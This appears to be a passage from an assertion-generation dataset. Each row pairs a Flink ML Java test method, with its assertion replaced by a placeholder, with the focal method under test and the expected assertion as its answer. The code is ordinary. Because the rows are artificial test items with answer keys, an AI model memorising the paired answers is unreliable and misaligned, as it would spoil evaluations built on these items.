"Exception { VarianceThresholdSelector varianceThresholdSelector = new VarianceThresholdSelector().setVarianceThreshold(8.0); VarianceThresholdSelector loadedVarianceThresholdSelector = TestUtils.saveAndReload( tEnv, varianceThresholdSelector, tempFolder.newFolder().getAbsolutePath(), VarianceThresholdSelector::load); VarianceThresholdSelectorModel model = loadedVarianceThresholdSelector.fit(trainDataTable); VarianceThresholdSelectorModel loadedModel = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), VarianceThresholdSelectorModel::load); ""<AssertPlaceHolder>""; Table output = loadedModel.transform(predictDataTable)[0]; verifyPredictionResult(output, varianceThresholdSelector.getOutputCol(), EXPECTED_OUTPUT); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<VarianceThresholdSelectorModelData> modelData = DataStreamUtils.aggregate( inputData, new VarianceThresholdSelectorAggregator(getVarianceThreshold()), Types.TUPLE( Types.LONG, DenseVectorTypeInfo.INSTANCE, DenseVectorTypeInfo.INSTANCE), TypeInformation.of(VarianceThresholdSelectorModelData.class));  VarianceThresholdSelectorModel model = new VarianceThresholdSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""numOfFeatures"", ""indices""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testFitOnEmptyData() { Table emptyTable = tEnv.fromDataStream( env.fromCollection( TRAIN_DATA, Types.ROW(Types.INT, VectorTypeInfo.INSTANCE)) .filter(x -> x.getArity() == 0)) .as(""id"", ""input"");  VarianceThresholdSelector varianceThresholdSelector = new VarianceThresholdSelector(); VarianceThresholdSelectorModel model = varianceThresholdSelector.fit(emptyTable); Table modelDataTable = model.getModelData()[0]; try { modelDataTable.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<VarianceThresholdSelectorModelData> modelData = DataStreamUtils.aggregate( inputData, new VarianceThresholdSelectorAggregator(getVarianceThreshold()), Types.TUPLE( Types.LONG, DenseVectorTypeInfo.INSTANCE, DenseVectorTypeInfo.INSTANCE), TypeInformation.of(VarianceThresholdSelectorModelData.class));  VarianceThresholdSelectorModel model = new VarianceThresholdSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals(""The training set is empty."", ExceptionUtils.getRootCause(e).getMessage())"
"testIncompatibleNumOfFeatures() { VarianceThresholdSelector varianceThresholdSelector = new VarianceThresholdSelector().setVarianceThreshold(8.0); VarianceThresholdSelectorModel model = varianceThresholdSelector.fit(trainDataTable);  List<Row> predictData = new ArrayList<>( Arrays.asList( Row.of(Vectors.dense(1.0, 2.0, 3.0, 4.0)), Row.of(Vectors.dense(0.1, 0.2, 0.3, 0.4)))); Table predictTable = tEnv.fromDataStream(env.fromCollection(predictData)).as(""input""); Table output = model.transform(predictTable)[0]; try { output.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<VarianceThresholdSelectorModelData> modelData = DataStreamUtils.aggregate( inputData, new VarianceThresholdSelectorAggregator(getVarianceThreshold()), Types.TUPLE( Types.LONG, DenseVectorTypeInfo.INSTANCE, DenseVectorTypeInfo.INSTANCE), TypeInformation.of(VarianceThresholdSelectorModelData.class));  VarianceThresholdSelectorModel model = new VarianceThresholdSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertTrue( ExceptionUtils.getRootCause(e) .getMessage() .contains(""but VarianceThresholdSelector is expecting""))"
"Exception { VectorAssembler vectorAssembler = new VectorAssembler() .setInputCols(""num"") .setOutputCol(""assembledVec"") .setInputSizes(1) .setHandleInvalid(HasHandleInvalid.KEEP_INVALID); Table output = vectorAssembler.transform(inputDataTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getInputSizes().length == getInputCols().length); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .flatMap( new AssemblerFunction( getInputCols(), getHandleInvalid(), getInputSizes()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( Arrays.asList(""id"", ""vec"", ""num"", ""sparseVec"", ""assembledVec""), output.getResolvedSchema().getColumnNames())"
"testErrorInvalidWithNull() { VectorAssembler vectorAssembler = new VectorAssembler() .setInputCols(""vec"", ""num"", ""sparseVec"") .setOutputCol(""assembledVec"") .setInputSizes(2, 1, 5) .setHandleInvalid(HasHandleInvalid.ERROR_INVALID);  try { Table outputTable = vectorAssembler.transform(inputNullDataTable)[0]; outputTable.execute().collect().next(); Assert.fail(""Expected IllegalArgumentException""); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getInputSizes().length == getInputCols().length); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .flatMap( new AssemblerFunction( getInputCols(), getHandleInvalid(), getInputSizes()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( ""Vector assembler failed with exception : java.lang.RuntimeException: "" + ""Input column value is null. Please check the input data or using handleInvalid = 'keep'."", ExceptionUtils.getRootCause(e).getMessage())"
"testErrorInvalidWithNaN() { VectorAssembler vectorAssembler = new VectorAssembler() .setInputCols(""vec"", ""num"", ""sparseVec"") .setOutputCol(""assembledVec"") .setInputSizes(2, 1, 5) .setHandleInvalid(HasHandleInvalid.ERROR_INVALID);  try { Table outputTable = vectorAssembler.transform(inputNanDataTable)[0]; outputTable.execute().collect().next(); Assert.fail(""Expected IllegalArgumentException""); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getInputSizes().length == getInputCols().length); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .flatMap( new AssemblerFunction( getInputCols(), getHandleInvalid(), getInputSizes()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( ""Vector assembler failed with exception : java.lang.RuntimeException: Encountered NaN "" + ""while assembling a row with handleInvalid = 'error'. Consider removing NaNs from "" + ""dataset or using handleInvalid = 'keep' or 'skip'."", ExceptionUtils.getRootCause(e).getMessage())"
"Exception { VectorAssembler vectorAssembler = new VectorAssembler() .setInputCols(""vec"", ""num"", ""sparseVec"") .setOutputCol(""assembledVec"") .setInputSizes(2, 1, 4) .setHandleInvalid(HasHandleInvalid.ERROR_INVALID); try { Table outputTable = vectorAssembler.transform(inputDataTable)[0]; outputTable.execute().collect().next(); Assert.fail(""Expected IllegalArgumentException""); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getInputSizes().length == getInputCols().length); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .flatMap( new AssemblerFunction( getInputCols(), getHandleInvalid(), getInputSizes()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( ""Vector assembler failed with exception : java.lang.IllegalArgumentException: "" + ""Input vector/number size does not meet with expected. Expected size: 4, actual size: 5."", ExceptionUtils.getRootCause(e).getMessage())"
"Exception { VectorAssembler vectorAssembler = new VectorAssembler() .setInputCols(""num"") .setOutputCol(""assembledVec"") .setInputSizes(1) .setHandleInvalid(HasHandleInvalid.KEEP_INVALID); Table output = vectorAssembler.transform(inputDataTable)[0];  DataStream<Row> dataStream = tEnv.toDataStream(output); List<Row> results = IteratorUtils.toList(dataStream.executeAndCollect()); for (Row result : results) { if (result.getField(2) != null) { ""<AssertPlaceHolder>""; } } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getInputSizes().length == getInputCols().length); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .flatMap( new AssemblerFunction( getInputCols(), getHandleInvalid(), getInputSizes()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	assertEquals(result.getField(2), ((DenseVector) result.getField(4)).values[0])
"testOutputSchema() { VectorIndexer vectorIndexer = new VectorIndexer(); Table output = vectorIndexer.fit(trainInputTable).transform(trainInputTable)[0];  ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); int maxCategories = getMaxCategories(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<List<Double>[]> localDistinctDoubles = tEnv.toDataStream(inputs[0]) .transform( ""computeDistinctDoublesOperator"", Types.OBJECT_ARRAY(Types.LIST(Types.DOUBLE)), new ComputeDistinctDoublesOperator(getInputCol(), maxCategories));  DataStream<List<Double>[]> distinctDoubles = DataStreamUtils.reduce( localDistinctDoubles, (ReduceFunction<List<Double>[]>) (value1, value2) -> { for (int i = 0; i < value1.length; i++) { if (value1[i] == null || value2[i] == null) { value1[i] = null; } else { HashSet<Double> tmp = new HashSet<>(value1[i]); tmp.addAll(value2[i]); value1[i] = new ArrayList<>(tmp); } } return value1; });  DataStream<VectorIndexerModelData> modelData = distinctDoubles.map( new ModelGenerator(maxCategories), VectorIndexerModelData.TYPE_INFO); modelData.getTransformation().setParallelism(1);  Schema schema = Schema.newBuilder() .column( ""categoryMaps"", DataTypes.MAP( DataTypes.INT(), DataTypes.MAP(DataTypes.DOUBLE(), DataTypes.INT()))) .build();  VectorIndexerModel model = new VectorIndexerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertEquals( Arrays.asList(vectorIndexer.getInputCol(), vectorIndexer.getOutputCol()), output.getResolvedSchema().getColumnNames())
"Exception { Table output; List<Row> expectedOutput; VectorIndexer vectorIndexer = new VectorIndexer().setMaxCategories(3);  // Keeps invalid data. expectedOutput = Arrays.asList( Row.of(Vectors.dense(0, 3)), Row.of(Vectors.dense(0, 0)), Row.of(Vectors.dense(0, 1))); vectorIndexer.setHandleInvalid(HasHandleInvalid.KEEP_INVALID); output = vectorIndexer.fit(trainInputTable).transform(testInputTable)[0]; verifyPredictionResult(expectedOutput, output, vectorIndexer.getOutputCol());  // Skips invalid data. vectorIndexer.setHandleInvalid(HasHandleInvalid.SKIP_INVALID); expectedOutput = Arrays.asList(Row.of(Vectors.dense(0, 0)), Row.of(Vectors.dense(0, 1))); output = vectorIndexer.fit(trainInputTable).transform(testInputTable)[0]; verifyPredictionResult(expectedOutput, output, vectorIndexer.getOutputCol());  // Throws an exception on invalid data. vectorIndexer.setHandleInvalid(HasHandleInvalid.ERROR_INVALID); try { output = vectorIndexer.fit(trainInputTable).transform(testInputTable)[0]; IteratorUtils.toList(tEnv.toDataStream(output).executeAndCollect()); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); int maxCategories = getMaxCategories(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<List<Double>[]> localDistinctDoubles = tEnv.toDataStream(inputs[0]) .transform( ""computeDistinctDoublesOperator"", Types.OBJECT_ARRAY(Types.LIST(Types.DOUBLE)), new ComputeDistinctDoublesOperator(getInputCol(), maxCategories));  DataStream<List<Double>[]> distinctDoubles = DataStreamUtils.reduce( localDistinctDoubles, (ReduceFunction<List<Double>[]>) (value1, value2) -> { for (int i = 0; i < value1.length; i++) { if (value1[i] == null || value2[i] == null) { value1[i] = null; } else { HashSet<Double> tmp = new HashSet<>(value1[i]); tmp.addAll(value2[i]); value1[i] = new ArrayList<>(tmp); } } return value1; });  DataStream<VectorIndexerModelData> modelData = distinctDoubles.map( new ModelGenerator(maxCategories), VectorIndexerModelData.TYPE_INFO); modelData.getTransformation().setParallelism(1);  Schema schema = Schema.newBuilder() .column( ""categoryMaps"", DataTypes.MAP( DataTypes.INT(), DataTypes.MAP(DataTypes.DOUBLE(), DataTypes.INT()))) .build();  VectorIndexerModel model = new VectorIndexerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( ""The input contains unseen double: 2.0. "" + ""See "" + HasHandleInvalid.HANDLE_INVALID + "" parameter for more options."", ExceptionUtils.getRootCause(e).getMessage())"
"Exception { VectorIndexer vectorIndexer = new VectorIndexer().setHandleInvalid(HasHandleInvalid.KEEP_INVALID); vectorIndexer = TestUtils.saveAndReload( tEnv, vectorIndexer, tempFolder.newFolder().getAbsolutePath(), VectorIndexer::load);  VectorIndexerModel model = vectorIndexer.fit(trainInputTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), VectorIndexerModel::load);  ""<AssertPlaceHolder>"";  Table output = model.transform(testInputTable)[0]; List<Row> expectedOutput = Arrays.asList( Row.of(Vectors.dense(5, 3)), Row.of(Vectors.dense(5, 0)), Row.of(Vectors.dense(5, 1))); verifyPredictionResult(expectedOutput, output, vectorIndexer.getOutputCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); int maxCategories = getMaxCategories(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<List<Double>[]> localDistinctDoubles = tEnv.toDataStream(inputs[0]) .transform( ""computeDistinctDoublesOperator"", Types.OBJECT_ARRAY(Types.LIST(Types.DOUBLE)), new ComputeDistinctDoublesOperator(getInputCol(), maxCategories));  DataStream<List<Double>[]> distinctDoubles = DataStreamUtils.reduce( localDistinctDoubles, (ReduceFunction<List<Double>[]>) (value1, value2) -> { for (int i = 0; i < value1.length; i++) { if (value1[i] == null || value2[i] == null) { value1[i] = null; } else { HashSet<Double> tmp = new HashSet<>(value1[i]); tmp.addAll(value2[i]); value1[i] = new ArrayList<>(tmp); } } return value1; });  DataStream<VectorIndexerModelData> modelData = distinctDoubles.map( new ModelGenerator(maxCategories), VectorIndexerModelData.TYPE_INFO); modelData.getTransformation().setParallelism(1);  Schema schema = Schema.newBuilder() .column( ""categoryMaps"", DataTypes.MAP( DataTypes.INT(), DataTypes.MAP(DataTypes.DOUBLE(), DataTypes.INT()))) .build();  VectorIndexerModel model = new VectorIndexerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Collections.singletonList(""categoryMaps""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testEmptyIndices() { try { VectorSlicer vectorSlicer = new VectorSlicer().setInputCol(""vec"").setOutputCol(""sliceVec"").setIndices(); vectorSlicer.transform(inputDataTable); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map(new VectorSliceFunction(getIndices(), getInputCol()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals(""Parameter indices is given an invalid value {}"", e.getMessage())"
"testIndicesLargerThanVectorSize() { try { VectorSlicer vectorSlicer = new VectorSlicer() .setInputCol(""vec"") .setOutputCol(""sliceVec"") .setIndices(1, 2, 10); Table output = vectorSlicer.transform(inputDataTable)[0]; DataStream<Row> dataStream = tEnv.toDataStream(output); IteratorUtils.toList(dataStream.executeAndCollect()); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol())); DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map(new VectorSliceFunction(getIndices(), getInputCol()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( ""Index value 10 is greater than vector size:6"", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { IndexToStringModel indexToStringModel = new IndexToStringModel() .setInputCols(""inputCol1"", ""inputCol2"") .setOutputCols(""outputCol1"", ""outputCol2"") .setModelData(modelTable); Table output = indexToStringModel.transform(predictTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); String[] inputCols = getInputCols(); String[] outputCols = getOutputCols(); Preconditions.checkArgument(inputCols.length == outputCols.length); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) modelDataTable).getTableEnvironment();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); TypeInformation<?>[] outputTypes = new TypeInformation[outputCols.length]; Arrays.fill(outputTypes, BasicTypeInfo.STRING_TYPE_INFO); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), outputTypes), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), outputCols));  final String broadcastModelKey = ""broadcastModelKey""; DataStream<StringIndexerModelData> modelDataStream = StringIndexerModelData.getModelDataStream(modelDataTable);  DataStream<Row> result = BroadcastUtils.withBroadcastStream( Collections.singletonList(tEnv.toDataStream(inputs[0])), Collections.singletonMap(broadcastModelKey, modelDataStream), inputList -> { DataStream inputData = inputList.get(0); return inputData.flatMap( new Index2String(broadcastModelKey, inputCols), outputTypeInfo); });  return new Table[] {tEnv.fromDataStream(result)}; }"	"assertEquals( Arrays.asList(""inputCol1"", ""inputCol2"", ""outputCol1"", ""outputCol2""), output.getResolvedSchema().getColumnNames())"
"testInputWithUnseenValues() { IndexToStringModel indexToStringModel = new IndexToStringModel() .setInputCols(""inputCol1"", ""inputCol2"") .setOutputCols(""outputCol1"", ""outputCol2"") .setModelData(modelTable); Table output = indexToStringModel.transform(predictTableWithUnseenValues)[0];  try { IteratorUtils.toList(tEnv.toDataStream(output).executeAndCollect()); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); String[] inputCols = getInputCols(); String[] outputCols = getOutputCols(); Preconditions.checkArgument(inputCols.length == outputCols.length); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) modelDataTable).getTableEnvironment();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); TypeInformation<?>[] outputTypes = new TypeInformation[outputCols.length]; Arrays.fill(outputTypes, BasicTypeInfo.STRING_TYPE_INFO); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), outputTypes), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), outputCols));  final String broadcastModelKey = ""broadcastModelKey""; DataStream<StringIndexerModelData> modelDataStream = StringIndexerModelData.getModelDataStream(modelDataTable);  DataStream<Row> result = BroadcastUtils.withBroadcastStream( Collections.singletonList(tEnv.toDataStream(inputs[0])), Collections.singletonMap(broadcastModelKey, modelDataStream), inputList -> { DataStream inputData = inputList.get(0); return inputData.flatMap( new Index2String(broadcastModelKey, inputCols), outputTypeInfo); });  return new Table[] {tEnv.fromDataStream(result)}; }"	"assertEquals( ""The input contains unseen index: 4."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { Swing swing = new Swing().setOutputCol(""item_score"").setMinUserBehavior(1); Table[] swingResultTables = swing.transform(inputTable); Table output = swingResultTables[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String userCol = getUserCol(); final String itemCol = getItemCol(); final ResolvedSchema schema = inputs[0].getResolvedSchema();  if (!(Types.LONG.equals(TableUtils.getTypeInfoByName(schema, userCol)) && Types.LONG.equals(TableUtils.getTypeInfoByName(schema, itemCol)))) { throw new IllegalArgumentException(""The types of user and item must be Long.""); }  if (getMaxUserBehavior() < getMinUserBehavior()) { throw new IllegalArgumentException( String.format( ""The maxUserBehavior must be greater than or equal to minUserBehavior. "" + ""The current setting: maxUserBehavior=%d, minUserBehavior=%d."", getMaxUserBehavior(), getMinUserBehavior())); }  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  SingleOutputStreamOperator<Tuple2<Long, Long>> purchasingBehavior = tEnv.toDataStream(inputs[0]) .map( row -> { Long userId = row.getFieldAs(userCol); Long itemId = row.getFieldAs(itemCol); if (userId == null || itemId == null) { throw new RuntimeException( ""Data of user and item column must not be null.""); } return Tuple2.of(userId, itemId); }) .returns(Types.TUPLE(Types.LONG, Types.LONG));  SingleOutputStreamOperator<Tuple3<Long, Long, long[]>> userBehavior = purchasingBehavior .keyBy(tuple -> tuple.f0) .transform( ""collectingUserBehavior"", Types.TUPLE( Types.LONG, Types.LONG, PrimitiveArrayTypeInfo.LONG_PRIMITIVE_ARRAY_TYPE_INFO), new CollectingUserBehavior( getMinUserBehavior(), getMaxUserBehavior()));  RowTypeInfo outputTypeInfo = new RowTypeInfo( new TypeInformation[] {Types.LONG, Types.STRING}, new String[] {getItemCol(), getOutputCol()});  DataStream<Row> output = userBehavior .keyBy(tuple -> tuple.f1) .transform( ""computingSimilarItems"", outputTypeInfo, new ComputingSimilarItems( getK(), getMaxUserNumPerItem(), getMaxUserBehavior(), getAlpha1(), getAlpha2(), getBeta(), getSeed()));  return new Table[] {tEnv.fromDataStream(output)}; }"	"assertEquals( Arrays.asList(""item"", ""item_score""), output.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = trainDataTable.as(""test_features"", ""test_label"", ""test_weight""); LinearRegression linearRegression = new LinearRegression() .setFeaturesCol(""test_features"") .setLabelCol(""test_label"") .setWeightCol(""test_weight"") .setPredictionCol(""test_predictionCol""); Table output = linearRegression.fit(trainDataTable).transform(tempTable)[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<LabeledPointWithWeight> trainData = tEnv.toDataStream(inputs[0]) .map( dataPoint -> { double weight = getWeightCol() == null ? 1.0 : ((Number) dataPoint.getField(getWeightCol())) .doubleValue(); double label = ((Number) dataPoint.getField(getLabelCol())) .doubleValue(); DenseVector features = ((Vector) dataPoint.getField(getFeaturesCol())) .toDense(); return new LabeledPointWithWeight(features, label, weight); });  DataStream<DenseVector> initModelData = DataStreamUtils.reduce( trainData.map(x -> x.getFeatures().size()), (ReduceFunction<Integer>) (t0, t1) -> { Preconditions.checkState( t0.equals(t1), ""The training data should all have same dimensions.""); return t0; }) .map(DenseVector::new);  Optimizer optimizer = new SGD( getMaxIter(), getLearningRate(), getGlobalBatchSize(), getTol(), getReg(), getElasticNet()); DataStream<DenseVector> rawModelData = optimizer.optimize(initModelData, trainData, LeastSquareLoss.INSTANCE);  DataStream<LinearRegressionModelData> modelData = rawModelData.map(LinearRegressionModelData::new); LinearRegressionModel model = new LinearRegressionModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Arrays.asList(""test_features"", ""test_label"", ""test_weight"", ""test_predictionCol""), output.getResolvedSchema().getColumnNames())"
"Exception { LinearRegression linearRegression = new LinearRegression().setWeightCol(""weight""); linearRegression = TestUtils.saveAndReload( tEnv, linearRegression, tempFolder.newFolder().getAbsolutePath(), LinearRegression::load); LinearRegressionModel model = linearRegression.fit(trainDataTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), LinearRegressionModel::load); ""<AssertPlaceHolder>""; Table output = model.transform(trainDataTable)[0]; verifyPredictionResult( output, linearRegression.getLabelCol(), linearRegression.getPredictionCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<LabeledPointWithWeight> trainData = tEnv.toDataStream(inputs[0]) .map( dataPoint -> { double weight = getWeightCol() == null ? 1.0 : ((Number) dataPoint.getField(getWeightCol())) .doubleValue(); double label = ((Number) dataPoint.getField(getLabelCol())) .doubleValue(); DenseVector features = ((Vector) dataPoint.getField(getFeaturesCol())) .toDense(); return new LabeledPointWithWeight(features, label, weight); });  DataStream<DenseVector> initModelData = DataStreamUtils.reduce( trainData.map(x -> x.getFeatures().size()), (ReduceFunction<Integer>) (t0, t1) -> { Preconditions.checkState( t0.equals(t1), ""The training data should all have same dimensions.""); return t0; }) .map(DenseVector::new);  Optimizer optimizer = new SGD( getMaxIter(), getLearningRate(), getGlobalBatchSize(), getTol(), getReg(), getElasticNet()); DataStream<DenseVector> rawModelData = optimizer.optimize(initModelData, trainData, LeastSquareLoss.INSTANCE);  DataStream<LinearRegressionModelData> modelData = rawModelData.map(LinearRegressionModelData::new); LinearRegressionModel model = new LinearRegressionModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Collections.singletonList(""coefficient""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testEuclideanOfIdenticalVectors() { VectorWithNorm vector = new VectorWithNorm(Vectors.dense(3.0, 3.0)); DistanceMeasure distanceMeasure = EuclideanDistanceMeasure.getInstance(); ""<AssertPlaceHolder>""; }
distance(VectorWithNorm v1, VectorWithNorm v2);  /** Finds the index of the closest center to the given point. */ default int findClosest(VectorWithNorm[] centroids, VectorWithNorm point) { int targetCentroidId = -1; double minDistance = Double.MAX_VALUE; for (int i = 0; i < centroids.length; i++) { double distance = distance(centroids[i], point); if (distance < minDistance) { minDistance = distance; targetCentroidId = i; } } return targetCentroidId; }"	assertEquals(0, distanceMeasure.distance(vector, vector))
"testAsum() { ""<AssertPlaceHolder>""; }
